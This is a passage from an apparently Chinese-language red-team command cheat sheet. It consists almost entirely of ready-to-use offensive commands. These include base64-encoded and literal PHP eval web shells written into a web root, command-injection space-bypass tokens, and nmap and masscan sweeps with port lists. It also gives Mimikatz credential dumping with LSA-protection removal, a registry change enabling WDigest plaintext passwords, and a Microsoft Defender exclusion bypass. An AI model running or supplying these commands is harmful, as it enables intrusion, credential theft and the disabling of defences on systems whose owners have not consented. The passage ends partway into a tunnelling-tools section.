    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>在windows中，批处理需要转义字符主要有 “&amp;”，“|”，“&lt;”，“&gt;”等等，转义字符为”^”
在Linux中，需要转义字符主要是 单引号 或者双引号 对于单引号，我们将其替换为\47即可。
windows命令行最大长度为8191,16进制长度是113898。echo写文件时注意长度。</p>
<p>方法1</p>
<pre tabindex="0"><code>set /p=qaxnb&lt;nul&gt;d:\1d13.txt</code></pre><p>方法2</p>
<pre tabindex="0"><code>echo qaxnb&gt;1we.txt</code></pre><p>追加内容</p>
<pre tabindex="0"><code>echo qaxnb&gt;&gt;1we.txt</code></pre><p>不换行追加</p>
<pre tabindex="0"><code>set /p=&#34;121d2&#34;&gt;&gt;a.txt</code></pre><p>规避空格</p>
<pre tabindex="0"><code>echo.123&gt;&gt;a.txt
echo,123&gt;&gt;a.txt
type;a.txt</code></pre><p>写特殊字符很多的文件，可以用certutil编码再还原。 如下还原</p>
<pre tabindex="0"><code>certutil -f -decode 111.txt C:\\111.jsp
certutil -decodehex 111.txt C:\\111.jsp</code></pre><p>linux下base64</p>
<pre tabindex="0"><code>echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php</code></pre><p>php的</p>
<pre tabindex="0"><code>echo \&lt;\?php eval\(\@\$_POST\[1\]\)\; \?\&gt; &gt;1.php</code></pre><p>绕过空格</p>
<pre tabindex="0"><code>&gt; &lt; &lt;&gt; 重定向符
%09(需要php环境)
${IFS}
$IFS$9
{cat,flag.php}
%20
%09</code></pre><h2 id="nmaphttpsbookshentoushitopmanualredteam_commandhtmlnmap" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nmap"target="_blank" rel="external nofollow noopener noreferrer">nmap</a></span>
  <a href="#nmaphttpsbookshentoushitopmanualredteam_commandhtmlnmap" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>nmap -sn 10.11.1.0/24
nmap -sV -p- 10.11.1.0
nmap 10.11.1.0 --script vuln
nmap -p445 10.11.1.0 --script smb-vuln-ms17-010
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oG tmp -iL ip.txt | awk &#39;{print $5}&#39; | grep -v &#34;latency).&#34; &gt;ok_ip.txt</code></pre><h2 id="masscanhttpsbookshentoushitopmanualredteam_commandhtmlmasscan" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#masscan"target="_blank" rel="external nofollow noopener noreferrer">masscan</a></span>
  <a href="#masscanhttpsbookshentoushitopmanualredteam_commandhtmlmasscan" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>注意速率问题,根据带宽调整。100m带宽可调3000,注意是vps，不是家庭宽带。</p>
<p>关于编译，直接git拉下来，make就行。生成的文件在bin下面。
扫描单ip</p>
<pre tabindex="0"><code>masscan 192.168.1.110 -p 1-65535 --rate=1000</code></pre><p>扫描列表</p>
<pre tabindex="0"><code>masscan -iL ip.txt -p1-65535 --rate=1000 -oL port.txt</code></pre><p>解析,提取ip:port</p>
<pre tabindex="0"><code>cat port.txt |awk &#39;{print $4&#34;:&#34;$3}&#39;</code></pre><p>转换为nmap可用端口</p>
<pre tabindex="0"><code>cat p.txt | tr &#34;\n&#34; ,</code></pre><h2 id="端口列表httpsbookshentoushitopmanualredteam_commandhtml端口列表" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e7%ab%af%e5%8f%a3%e5%88%97%e8%a1%a8"target="_blank" rel="external nofollow noopener noreferrer">端口列表</a></span>
  <a href="#%e7%ab%af%e5%8f%a3%e5%88%97%e8%a1%a8httpsbookshentoushitopmanualredteam_commandhtml%e7%ab%af%e5%8f%a3%e5%88%97%e8%a1%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>22,23,135,445,389,3389,80,443,8080,7001,3306,1433,1521,6379,27017,2375,5900,5432,4899

21-23,80-90,135,137,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2375,2376,2601,2604,3128,3306,3311,3312,3389,4440,4848,5001,5432,5560,5900-5902,6082,6379,7001-7010,7778,8009,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,51111,50030,50060

20-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50050,50300,50389,50500,50636,50800,51111,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389</code></pre><h2 id="字典httpsbookshentoushitopmanualredteam_commandhtml字典" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%ad%97%e5%85%b8"target="_blank" rel="external nofollow noopener noreferrer">字典</a></span>
  <a href="#%e5%ad%97%e5%85%b8httpsbookshentoushitopmanualredteam_commandhtml%e5%ad%97%e5%85%b8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><!-- raw HTML omitted -->
<h2 id="mimikatzhttpsbookshentoushitopmanualredteam_commandhtmlmimikatz" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#mimikatz"target="_blank" rel="external nofollow noopener noreferrer">Mimikatz</a></span>
  <a href="#mimikatzhttpsbookshentoushitopmanualredteam_commandhtmlmimikatz" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>一条命令</p>
<pre tabindex="0"><code>.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit</code></pre><p>控制台执行多条命令，用log防止进程崩溃，数据丢失</p>
<pre tabindex="0"><code>mimikatz # privilege::debug
mimikatz # log
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest</code></pre><p>msf中执行命令</p>
<pre tabindex="0"><code>mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest</code></pre><p>注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。</p>
<pre tabindex="0"><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1</code></pre><h3 id="bypass-lsa-protectionpplhttpsbookshentoushitopmanualredteam_commandhtmlbypass-lsa-protectionppl" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bypass-lsa-protectionppl"target="_blank" rel="external nofollow noopener noreferrer">bypass lsa Protection(ppl)</a></span>
  <a href="#bypass-lsa-protectionpplhttpsbookshentoushitopmanualredteam_commandhtmlbypass-lsa-protectionppl" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>查询是否启用</p>
<pre tabindex="0"><code>reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code></pre><p>把mimidriver.sys拷贝到同级目录，进行加载bypass</p>
<pre tabindex="0"><code>mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug    
mimikatz # token::elevate
mimikatz # sekurlsa::logonpasswords
mimikatz # !processprotect /process:lsass.exe
mimikatz # !-</code></pre><h2 id="cs凭证解析httpsbookshentoushitopmanualredteam_commandhtmlcs凭证解析" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#cs%e5%87%ad%e8%af%81%e8%a7%a3%e6%9e%90"target="_blank" rel="external nofollow noopener noreferrer">cs凭证解析</a></span>
  <a href="#cs%e5%87%ad%e8%af%81%e8%a7%a3%e6%9e%90httpsbookshentoushitopmanualredteam_commandhtmlcs%e5%87%ad%e8%af%81%e8%a7%a3%e6%9e%90" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>提取用户名</p>
<pre tabindex="0"><code>awk -F&#34;:::&#34; &#39;{print $1}&#39; credentials.txt | awk -F&#34;\\&#34; &#39;{print $2}&#39;</code></pre><p>提取hash</p>
<pre tabindex="0"><code>awk -F&#34;:::&#34; &#39;{print $2}&#39; credentials.txt</code></pre><h2 id="存活主机httpsbookshentoushitopmanualredteam_commandhtml存活主机" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%ba"target="_blank" rel="external nofollow noopener noreferrer">存活主机</a></span>
  <a href="#%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%bahttpsbookshentoushitopmanualredteam_commandhtml%e5%ad%98%e6%b4%bb%e4%b8%bb%e6%9c%ba" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>for /L %I in (1,1,256) DO @ping -w 1 -l 1 192.168.202.%I | findstr &#34;TTL=&#34;</code></pre><h2 id="bypasshttpsbookshentoushitopmanualredteam_commandhtmlbypass" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#bypass"target="_blank" rel="external nofollow noopener noreferrer">bypass</a></span>
  <a href="#bypasshttpsbookshentoushitopmanualredteam_commandhtmlbypass" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Defender排除项</p>
<pre tabindex="0"><code>powershell -ExecutionPolicy Bypass Add-MpPreference -ExclusionPath &#34;C:\test&#34;</code></pre><h2 id="gobusterhttpsbookshentoushitopmanualredteam_commandhtmlgobuster" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#gobuster"target="_blank" rel="external nofollow noopener noreferrer">gobuster</a></span>
  <a href="#gobusterhttpsbookshentoushitopmanualredteam_commandhtmlgobuster" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt</code></pre><h2 id="dirsearchhttpsbookshentoushitopmanualredteam_commandhtmldirsearch" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#dirsearch"target="_blank" rel="external nofollow noopener noreferrer">dirsearch</a></span>
  <a href="#dirsearchhttpsbookshentoushitopmanualredteam_commandhtmldirsearch" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>python3 dirsearch.py -e php,html,js -u https://target
python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20
python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080
python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</code></pre><h2 id="nbtscanhttpsbookshentoushitopmanualredteam_commandhtmlnbtscan" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#nbtscan"target="_blank" rel="external nofollow noopener noreferrer">nbtscan</a></span>
  <a href="#nbtscanhttpsbookshentoushitopmanualredteam_commandhtmlnbtscan" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><pre tabindex="0"><code>nbtscan.exe 10.11.1.0/24</code></pre><h2 id="代理工具httpsbookshentoushitopmanualredteam_commandhtml代理工具" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e4%bb%a3%e7%90%86%e5%b7%a5%e5%85%b7"target="_blank" rel="external nofollow noopener noreferrer">代理工具</a></span>
  <a href="#%e4%bb%a3%e7%90%86%e5%b7%a5%e5%85%b7httpsbookshentoushitopmanualredteam_commandhtml%e4%bb%a3%e7%90%86%e5%b7%a5%e5%85%b7" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>proxychain
sockscap64
proxifier</p>
<p><a href="https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti"target="_blank" rel="external nofollow noopener noreferrer">https://drive.google.com/drive/folders/1x5naJeK2YkV6QCYUlUg5QNMl1Izf4-ti</a>
<a href="https://www.mediafire.com/folder/32rj1769a2w82/v4.7"target="_blank" rel="external nofollow noopener noreferrer">https://www.mediafire.com/folder/32rj1769a2w82/v4.7</a></p>
<h2 id="内网穿透工具httpsbookshentoushitopmanualredteam_commandhtml内网穿透工具" class="heading-element"><span><a href="https://book.shentoushi.top/Manual/RedTeam_Command.html#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e5%b7%a5%e5%85%b7"target="_blank" rel="external nofollow noopener noreferrer">内网穿透工具</a></span>
  <a href="#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e5%b7%a5%e5%85%b7httpsbookshentoushitopmanualredteam_commandhtml%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f%e5%b7%a5%e5%85%b7" class="heading-mark">
